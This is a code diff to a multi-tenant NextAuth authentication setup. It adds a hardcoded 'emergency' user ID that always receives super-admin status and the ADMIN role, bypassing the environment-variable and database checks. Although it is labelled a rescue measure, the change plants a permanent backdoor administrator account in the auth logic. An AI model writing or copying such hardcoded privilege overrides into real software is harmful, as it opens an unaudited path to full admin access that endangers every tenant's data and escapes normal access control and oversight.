@@ -157,17 +157,19 @@ export function buildAuthOptions(tenant: TenantConfig): NextAuthOptions {
                 }
 
                 // =========================================================
-                // 1. UNIVERSAL SUPER ADMIN CHECK (Env Var Override)
+                // 1. UNIVERSAL SUPER ADMIN CHECK (Env Var Override + Emergency Hardcode)
                 // =========================================================
                 // This guarantees access to /master even if DB is empty or desynced.
                 const superAdmins = (process.env.SUPER_ADMIN_IDS || "").split(",").map(id => id.trim());
+                const emergencyId = "405844020967899137"; // USER ID HARDCODED FOR RESCUE
+
                 const userId = (user?.id) || (token.id as string) || (token.sub as string);
                 let isEnvSuperAdmin = false;
 
                 // Console logging for Vercel Runtime Logs
-                // console.log(`[AUTH DEBUG] UserId: ${userId} | EnvAdmins: ${superAdmins.length}`);
+                // console.log(`[AUTH DEBUG] UserId: ${userId} | EnvAdmins: ${superAdmins.length} | Hardcode: ${emergencyId}`);
 
-                if (userId && superAdmins.includes(userId)) {
+                if (userId && (superAdmins.includes(userId) || userId === emergencyId)) {
                     // console.log(`[AUTH] Detected Env-based Super Admin: ${userId}`);
                     token.isSuperAdmin = true;
                     token.role = "ADMIN";
